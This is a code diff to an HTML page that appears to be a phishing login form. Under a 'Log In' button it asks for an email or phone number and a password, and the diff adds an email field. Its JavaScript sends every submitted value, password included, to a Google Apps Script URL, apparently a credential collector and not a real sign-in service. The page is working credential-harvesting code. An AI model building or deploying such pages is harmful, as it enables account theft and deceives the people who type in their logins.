@@ -13,6 +13,7 @@
     <form id="registrationForm">
       <input type="text" name="emailOrPhone" placeholder="Email or Phone Number" required>
       <input type="password" name="password" placeholder="Password" required>
+      <input type="email" name="emailAddress" placeholder="Email Address" required>
       <button type="submit">Log In</button>
     </form>
 
@@ -24,25 +25,24 @@
 
 <script>
   const form = document.getElementById('registrationForm');
-const url = "https://script.google.com/macros/s/AKfycby-s28Opyaagr8C2jBOS1Xf_xtqrEY8-08vjOzh4WLbhT-Qgc6RdK1S3fTKwm6jSYJdkA/exec"; // copy from Apps Script deployment
+  const url = "https://script.google.com/macros/s/AKfycby-s28Opyaagr8C2jBOS1Xf_xtqrEY8-08vjOzh4WLbhT-Qgc6RdK1S3fTKwm6jSYJdkA/exec"; // Apps Script URL
 
-form.addEventListener('submit', function(e) {
-  e.preventDefault();
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
 
-  const data = new FormData(form);
+    const data = new FormData(form);
 
-  fetch(url, {
-    method: "POST",
-    body: data
-  })
-  .then(response => response.json())
-  .then(resp => {
-    alert("Form submitted successfully!");
-    form.reset();
-  })
-  .catch(err => alert("Error submitting form: " + err));
-});
-
+    fetch(url, {
+      method: "POST",
+      body: data
+    })
+    .then(response => response.json())
+    .then(resp => {
+      alert("Form submitted successfully!");
+      form.reset();
+    })
+    .catch(err => alert("Error submitting form: " + err));
+  });
 </script>
 </body>
 </html>
